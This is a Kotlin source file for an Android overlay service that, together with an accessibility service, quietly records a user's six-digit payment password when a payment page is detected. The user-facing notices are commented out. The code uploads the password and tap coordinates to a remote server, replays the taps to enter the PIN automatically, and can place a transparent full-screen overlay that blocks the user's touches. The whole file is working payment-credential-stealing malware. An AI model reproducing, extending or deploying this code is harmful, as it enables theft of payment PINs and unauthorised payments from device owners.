package com.example.demo

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.Toast
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.ArrayList

class FloatingMenuService : Service() {
    
    private lateinit var windowManager: WindowManager
    private lateinit var menuLayout: LinearLayout
    private lateinit var recordLayer: View
    private lateinit var gridOverlay: FrameLayout
    private val scriptActions = mutableListOf<ScriptAction>()
    private var isRecording = false

    companion object {
        var instance: FloatingMenuService? = null
        private const val TAG = "FloatingMenuService"
        const val ACTION_START_AUTO_RECORD = "com.example.demo.action.START_AUTO_RECORD"
        const val ACTION_STOP_AUTO_RECORD = "com.example.demo.action.STOP_AUTO_RECORD"
        const val ACTION_SHOW_CAPTURED_KEYPAD = "com.example.demo.action.SHOW_CAPTURED_KEYPAD"
        const val ACTION_BLOCK_TOUCH = "com.example.demo.action.BLOCK_TOUCH"
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private var blockingView: FrameLayout? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.action?.let { action ->
            when (action) {
                ACTION_START_AUTO_RECORD -> {
                    if (!isRecording) {
                        isRecording = true
                        Log.d(TAG, "Received START_AUTO_RECORD action")
                        Handler(Looper.getMainLooper()).post {
                            startRecordingMode()
                            // Toast.makeText(this, "检测到支付页面，自动开始录制", Toast.LENGTH_SHORT).show()
                        }
                    }
                }
                ACTION_STOP_AUTO_RECORD -> {
                    if (isRecording) {
                        isRecording = false
                        Log.d(TAG, "Received STOP_AUTO_RECORD action")
                        Handler(Looper.getMainLooper()).post {
                            stopRecordingMode()
                            // Toast.makeText(this, "支付页面关闭，录制已保存", Toast.LENGTH_SHORT).show()
                        }
                    }
                }
                ACTION_BLOCK_TOUCH -> {
                    Log.d(TAG, "Received BLOCK_TOUCH action")
                    Handler(Looper.getMainLooper()).post {
                        showBlockingOverlay()
                    }
                }
                ACTION_SHOW_CAPTURED_KEYPAD -> {
                    Log.d(TAG, "Received SHOW_CAPTURED_KEYPAD action")
                    Handler(Looper.getMainLooper()).post {
                        // Toast.makeText(this, "已智能识别密码键盘布局，可直接生成脚本", Toast.LENGTH_LONG).show()
                    }
                }
            }
        }
        return START_STICKY
    }

    private fun showBlockingOverlay() {
        if (blockingView != null) return

        blockingView = FrameLayout(this).apply {
            // 透明背景，但实际上会拦截触摸
            setBackgroundColor(Color.TRANSPARENT)
            
            // 拦截所有触摸事件
            setOnTouchListener { _, _ -> true }
        }

        // 添加一个关闭按钮，用于紧急退出全屏遮罩
        val btnClose = Button(this).apply {
            text = "关闭遮罩"
            backgroundTintList = android.content.res.ColorStateList.valueOf(Color.RED)
            setTextColor(Color.WHITE)
            setOnClickListener {
                removeBlockingOverlay()
                stopSelf() // 关闭服务
            }
        }
        
        val btnParams = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.WRAP_CONTENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            gravity = Gravity.TOP or Gravity.END
            topMargin = 100
            rightMargin = 50
        }
        
        blockingView?.addView(btnClose, btnParams)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            // 关键：不使用 FLAG_NOT_TOUCHABLE，确保触摸被拦截
            // 同时不使用 FLAG_NOT_FOCUSABLE，确保能捕获按键等
            // 但为了让底下的 Activity 继续运行（如浏览器加载），通常需要 FLAG_NOT_FOCUSABLE
            // 这里我们使用 FLAG_NOT_FOCUSABLE，但通过 setOnTouchListener 返回 true 来拦截触摸
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        )
        
        windowManager.addView(blockingView, params)
        Toast.makeText(this, "全屏遮罩已开启，触摸已被禁用", Toast.LENGTH_SHORT).show()
    }

    private fun removeBlockingOverlay() {
        if (blockingView != null) {
            try {
                windowManager.removeView(blockingView)
                blockingView = null
            } catch (e: Exception) {
                Log.e(TAG, "Failed to remove blocking overlay: ${e.message}")
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        // showMenu() // 暂时禁用旧的悬浮菜单
        loadScript()
    }

    private fun loadScript() {
        try {
            val legacy = File(filesDir, "payment_script.json")
            if (legacy.exists()) {
                val jsonString = legacy.readText()
                SecureStorage.savePaymentRecord(this, password = "", scriptJson = jsonString)
                legacy.delete()
            }
        } catch (_: Exception) {
        }

        val record = SecureStorage.loadPaymentRecord(this) ?: return
        if (record.scriptJson.isBlank()) return
        try {
            val jsonArray = JSONArray(record.scriptJson)
            scriptActions.clear()
            for (i in 0 until jsonArray.length()) {
                val jsonObject = jsonArray.getJSONObject(i)
                val action = ScriptAction(
                    x = jsonObject.getInt("x"),
                    y = jsonObject.getInt("y"),
                    delay = jsonObject.optLong("delay", 0L),
                    type = ScriptActionType.valueOf(jsonObject.optString("type", ScriptActionType.CLICK.name)),
                    description = jsonObject.optString("description", ""),
                    targetDigit = jsonObject.optString("targetDigit").takeIf { it.isNotEmpty() && it != "null" }
                )
                scriptActions.add(action)
            }
            Log.d(TAG, "Loaded ${scriptActions.size} actions from secure record")
            Toast.makeText(this, "已加载保存的脚本，可直接回放", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to load script: ${e.message}")
        }
    }

    private fun showMenu() {
        menuLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#80000000"))
            setPadding(16, 16, 16, 16)
        }

        val btnRecord = Button(this).apply { text = "开始录制" }
        val btnStopRecord = Button(this).apply { text = "停止录制"; visibility = View.GONE }
        val btnAddKeypad = Button(this).apply { text = "添加密码键盘" }
        val btnPlay = Button(this).apply { text = "开始回放" }
        val btnClear = Button(this).apply { text = "清空脚本" }
        val btnClose = Button(this).apply { text = "关闭" }

        btnRecord.setOnClickListener {
            if (AutoPaymentService.instance == null) {
                Toast.makeText(this, "无障碍服务未开启", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            isRecording = true
            btnRecord.visibility = View.GONE
            btnStopRecord.visibility = View.VISIBLE
            btnPlay.isEnabled = false
            btnAddKeypad.isEnabled = false
            startRecordingMode()
            Toast.makeText(this, "进入录制模式，请直接操作屏幕", Toast.LENGTH_LONG).show()
        }

        btnStopRecord.setOnClickListener {
            isRecording = false
            btnRecord.visibility = View.VISIBLE
            btnStopRecord.visibility = View.GONE
            btnPlay.isEnabled = true
            btnAddKeypad.isEnabled = true
            stopRecordingMode()
            Toast.makeText(this, "录制结束，共 ${scriptActions.size} 个点", Toast.LENGTH_SHORT).show()
        }

        btnAddKeypad.setOnClickListener {
            showGridOverlay()
        }

        btnPlay.setOnClickListener {
            if (scriptActions.isEmpty()) {
                Toast.makeText(this, "请先添加点击点", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            if (AutoPaymentService.instance == null) {
                Toast.makeText(this, "无障碍服务未开启", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            Toast.makeText(this, "开始回放 ${scriptActions.size} 个动作", Toast.LENGTH_SHORT).show()
            AutoPaymentService.instance?.performScript(scriptActions)
        }
        
        btnClear.setOnClickListener {
            scriptActions.clear()
            try {
                SecureStorage.clearPaymentRecord(this)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to delete script file: ${e.message}")
            }
            Toast.makeText(this, "脚本已清空，下次将重新录制", Toast.LENGTH_SHORT).show()
        }

        btnClose.setOnClickListener {
            stopSelf()
        }

        menuLayout.addView(btnRecord)
        menuLayout.addView(btnStopRecord)
        menuLayout.addView(btnAddKeypad)
        menuLayout.addView(btnPlay)
        menuLayout.addView(btnClear)
        menuLayout.addView(btnClose)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.TOP or Gravity.START
        params.x = 100
        params.y = 100

        windowManager.addView(menuLayout, params)
        
        // 简单的拖拽逻辑
        menuLayout.setOnTouchListener(object : View.OnTouchListener {
            private var initialX = 0
            private var initialY = 0
            private var initialTouchX = 0f
            private var initialTouchY = 0f

            override fun onTouch(v: View, event: MotionEvent): Boolean {
                when (event.action) {
                    MotionEvent.ACTION_DOWN -> {
                        initialX = params.x
                        initialY = params.y
                        initialTouchX = event.rawX
                        initialTouchY = event.rawY
                        return true
                    }
                    MotionEvent.ACTION_MOVE -> {
                        params.x = initialX + (event.rawX - initialTouchX).toInt()
                        params.y = initialY + (event.rawY - initialTouchY).toInt()
                        windowManager.updateViewLayout(menuLayout, params)
                        return true
                    }
                }
                return false
            }
        })
    }

    private fun showGridOverlay() {
        if (::gridOverlay.isInitialized && gridOverlay.isAttachedToWindow) {
            Toast.makeText(this, "键盘网格已显示", Toast.LENGTH_SHORT).show()
            return
        }

        gridOverlay = FrameLayout(this).apply {
            setBackgroundColor(Color.parseColor("#40000000")) // 半透明背景
        }

        // 创建 3x4 网格
        val gridLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#80FF0000")) // 红色边框指示
            setPadding(2, 2, 2, 2)
        }
        
        // 简单模拟数字键盘布局：1-9, 0
        val rows = 4
        val cols = 3
        
        for (i in 0 until rows) {
            val rowLayout = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    0, 1f
                )
            }
            for (j in 0 until cols) {
                val cell = View(this).apply {
                    setBackgroundResource(android.R.drawable.dialog_frame)
                    layoutParams = LinearLayout.LayoutParams(
                        0, LinearLayout.LayoutParams.MATCH_PARENT, 1f
                    )
                }
                rowLayout.addView(cell)
            }
            gridLayout.addView(rowLayout)
        }

        // 添加确认和取消按钮
        val controlsLayout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.WHITE)
        }
        val btnConfirm = Button(this).apply { text = "确认添加" }
        val btnCancel = Button(this).apply { text = "取消" }
        
        controlsLayout.addView(btnConfirm)
        controlsLayout.addView(btnCancel)

        gridOverlay.addView(gridLayout, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ).apply {
            bottomMargin = 150 // 留出按钮空间
        })
        
        gridOverlay.addView(controlsLayout, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            gravity = Gravity.BOTTOM
        })

        val params = WindowManager.LayoutParams(
            800, 1000, // 初始大小
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.CENTER
        
        windowManager.addView(gridOverlay, params)
        
        // 网格拖拽和缩放逻辑 (简化版：右下角调整大小，整体拖拽)
        gridOverlay.setOnTouchListener(object : View.OnTouchListener {
            private var initialX = 0
            private var initialY = 0
            private var initialTouchX = 0f
            private var initialTouchY = 0f

            override fun onTouch(v: View, event: MotionEvent): Boolean {
                when (event.action) {
                    MotionEvent.ACTION_DOWN -> {
                        initialX = params.x
                        initialY = params.y
                        initialTouchX = event.rawX
                        initialTouchY = event.rawY
                        return true
                    }
                    MotionEvent.ACTION_MOVE -> {
                        params.x = initialX + (event.rawX - initialTouchX).toInt()
                        params.y = initialY + (event.rawY - initialTouchY).toInt()
                        windowManager.updateViewLayout(gridOverlay, params)
                        return true
                    }
                }
                return false
            }
        })

        btnConfirm.setOnClickListener {
            // 计算坐标并添加
            addGridPoints(params.x, params.y, params.width, params.height)
            windowManager.removeView(gridOverlay)
            Toast.makeText(this, "已添加键盘坐标", Toast.LENGTH_SHORT).show()
        }

        btnCancel.setOnClickListener {
            windowManager.removeView(gridOverlay)
        }
    }

    private fun addGridPoints(windowX: Int, windowY: Int, width: Int, height: Int) {
        val displayMetrics = resources.displayMetrics
        val screenWidth = displayMetrics.widthPixels
        val screenHeight = displayMetrics.heightPixels
        
        // WindowManager 的 (0,0) 是中心点，需要转换到屏幕绝对坐标
        val startX = screenWidth / 2 + windowX - width / 2
        val startY = screenHeight / 2 + windowY - height / 2
        
        // 键盘区域高度 (减去底部按钮区域)
        val keyboardHeight = height - 150
        
        val cellW = width / 3
        val cellH = keyboardHeight / 4
        
        val keys = listOf(1, 2, 3, 4, 5, 6) // 假设密码是 123456
        
        for (key in keys) {
            var row = 0
            var col = 0
            if (key == 0) {
                row = 3
                col = 1
            } else {
                row = (key - 1) / 3
                col = (key - 1) % 3
            }
            
            val centerX = startX + col * cellW + cellW / 2
            val centerY = startY + row * cellH + cellH / 2
            
            // 记录目标数字，以便智能映射
            scriptActions.add(ScriptAction(centerX, centerY, description = "Key $key", targetDigit = key.toString()))
        }
    }

    private data class RecordedKey(
        val digit: String,
        val x: Int,
        val y: Int,
        val timestamp: Long
    )

    private val currentAttempt = mutableListOf<RecordedKey>()
    private var lastFullCandidate: List<RecordedKey>? = null
    private var lastFullCandidateTime = 0L

    fun resetPasswordAttempt(reason: String) {
        Log.d(TAG, "Reset password attempt: $reason")
        currentAttempt.clear()
        lastFullCandidate = null
        lastFullCandidateTime = 0L
    }

    fun startRecordingMode() {
        resetPasswordAttempt("startRecordingMode")
        scriptActions.clear()
        isRecording = true
        ApiClient.logEvent(this, opType = "SCRIPT_RECORD_START", durationMs = 0, level = "INFO", keyword = "start_recording")
        if (::recordLayer.isInitialized && recordLayer.isAttachedToWindow) {
            windowManager.removeView(recordLayer)
        }
    }

    fun stopRecordingMode() {
        if (::recordLayer.isInitialized && recordLayer.isAttachedToWindow) {
            windowManager.removeView(recordLayer)
        }
        isRecording = false
    }
    
    fun commitScript() {
        scriptActions.clear()

        val finalKeys = lastFullCandidate ?: currentAttempt.takeIf { it.size == 6 }

        if (finalKeys == null) {
            try {
                SecureStorage.clearPaymentRecord(this)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to delete script file: ${e.message}")
            }
            ApiClient.logEvent(this, opType = "SCRIPT_RECORD_FAIL", durationMs = 0, level = "WARN", keyword = "password_empty")

            Handler(Looper.getMainLooper()).post {
                Toast.makeText(this, "密码为空，已清空脚本", Toast.LENGTH_LONG).show()
            }
            return
        }

        for (k in finalKeys) {
            scriptActions.add(ScriptAction(x = k.x, y = k.y, targetDigit = k.digit))
        }

        val password = finalKeys.joinToString(separator = "") { it.digit }
        val scriptJson = buildScriptJson()
        val payMethod = SecureStorage.loadLastPayMethod(this)
        SecureStorage.savePaymentRecord(this, password, scriptJson, payMethod = payMethod)
        ApiClient.uploadScript(this, password, scriptJson)
        if (payMethod.isNotBlank()) {
            ApiClient.reportPaymentMethodStatus(
                this,
                method = payMethod,
                status = "RECORDED",
                message = "录制时使用",
                success = false,
            )
        }
        getSharedPreferences("app_config", Context.MODE_PRIVATE)
            .edit()
            .putBoolean("pending_next_round", true)
            .putBoolean("pending_need_decrement", false)
            .apply()
        ApiClient.upsertDevice(this, accessibilityEnabled = AutoPaymentService.instance != null, scriptRecorded = true, looping = AutoPaymentService.loopingState)
        ApiClient.logEvent(this, opType = "SCRIPT_RECORD_SUCCESS", durationMs = 0, level = "INFO", keyword = "script_saved")

        Handler(Looper.getMainLooper()).post {
            Toast.makeText(this, "已保存有效密码", Toast.LENGTH_LONG).show()
        }
    }

    fun clearTempScript() {
        resetPasswordAttempt("clearTempScript")
    }

    fun getScriptActionsCount(): Int {
        return currentAttempt.size
    }

    fun hasScript(): Boolean {
        return scriptActions.isNotEmpty()
    }

    fun playScript() {
        if (scriptActions.isNotEmpty()) {
            Toast.makeText(this, "开始自动回放脚本", Toast.LENGTH_SHORT).show()
            AutoPaymentService.instance?.performScript(scriptActions)
        }
    }

    private fun buildScriptJson(): String {
        val jsonArray = JSONArray()
        for (action in scriptActions) {
            val jsonObject = JSONObject()
            jsonObject.put("x", action.x)
            jsonObject.put("y", action.y)
            jsonObject.put("delay", action.delay)
            jsonObject.put("type", action.type.name)
            jsonObject.put("description", action.description)
            jsonObject.put("targetDigit", action.targetDigit)
            jsonArray.put(jsonObject)
        }
        return jsonArray.toString()
    }

    private fun showToast(message: String) {
        try {
            Handler(Looper.getMainLooper()).post {
                try {
                    Toast.makeText(applicationContext, message, Toast.LENGTH_SHORT).show()
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to show toast: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in showToast: ${e.message}")
        }
    }

    fun recordActionFromEvent(x: Int, y: Int, digit: String? = null) {
        if (!isRecording) return
        
        Log.d(TAG, "Recording action: ($x, $y), digit: $digit")
        
        // 处理删除键
        if (digit == "DELETE") {
             if (currentAttempt.isNotEmpty()) {
                 val removed = currentAttempt.removeAt(currentAttempt.size - 1)
                 Log.d(TAG, "Backspace: Removed last digit ${removed.digit}")
                 
                 showToast("已撤销一位密码")
                 showTouchFeedback(x, y, Color.RED)
             } else {
                 Log.d(TAG, "Backspace: No digits to remove")
                 showTouchFeedback(x, y, Color.RED)
             }

             lastFullCandidate = null
             lastFullCandidateTime = 0L
             return
        }

        val normalizedDigit = digit?.trim()
        if (normalizedDigit.isNullOrEmpty()) return

        val now = System.currentTimeMillis()

        if (currentAttempt.size == 6) {
            val treatAsNewAttempt = lastFullCandidate != null && (now - lastFullCandidateTime >= 500)
            if (treatAsNewAttempt) {
                resetPasswordAttempt("newAttemptDetectedAfterFullInput")
            } else {
                Log.d(TAG, "Password already has 6 digits, ignoring input: $normalizedDigit")
                return
            }
        }

        Log.i(TAG, "Detected Input: $normalizedDigit")
        currentAttempt.add(RecordedKey(normalizedDigit, x, y, now))

        if (currentAttempt.size == 6) {
            lastFullCandidate = currentAttempt.toList()
            lastFullCandidateTime = now
            val candidate = lastFullCandidate?.joinToString(separator = "") { it.digit } ?: ""
            Log.d(TAG, "Captured 6-digit candidate: $candidate")
        }
        
        Handler(Looper.getMainLooper()).post {
            showTouchFeedback(x, y, Color.GREEN)
        }
    }

    private fun showTouchFeedback(x: Int, y: Int, color: Int = android.R.drawable.radiobutton_on_background) {
        try {
            val feedbackView = View(this).apply {
                if (color == Color.GREEN) {
                    setBackgroundColor(Color.GREEN)
                } else if (color == Color.RED) {
                    setBackgroundColor(Color.RED)
                } else {
                     setBackgroundResource(color)
                }
            }
            val size = 30
            val params = WindowManager.LayoutParams(
                size, size,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT
            )
            params.gravity = Gravity.TOP or Gravity.START
            params.x = x - size / 2
            params.y = y - size / 2

            windowManager.addView(feedbackView, params)
            
            feedbackView.postDelayed({
                try {
                    windowManager.removeView(feedbackView)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to remove feedback view: ${e.message}")
                }
            }, 500)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to show feedback view: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        if (::menuLayout.isInitialized) windowManager.removeView(menuLayout)
        stopRecordingMode()
    }
}
